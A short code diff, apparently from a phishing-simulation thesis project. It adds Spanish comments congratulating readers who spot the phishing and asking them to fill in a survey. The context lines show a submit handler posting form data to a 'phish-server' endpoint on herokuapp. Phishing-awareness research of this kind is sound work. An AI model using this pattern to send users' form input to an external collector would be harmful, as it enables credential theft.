@@ -84,6 +84,11 @@ $form?.addEventListener('submit', async (event) => {
     }
   }
 
+  // SI VISTE ESTE MENSAJE, FELICIDADES, EVITASTE CAER EN PHISHING
+  // ESTE ES UN PROYECTO DE TESIS FINAL. POR FAVOR LLENÁ EL SIGUIENTE FORMULARIO
+  // TOMA 2 MINUTOS 🙏🏻
+  // https://forms.gle/5M4QRaNf4rRQEo1i6
+
   await fetch(
     'https://phish-server-tfi-d57910f14e33.herokuapp.com/api/v1/register/form',
     {
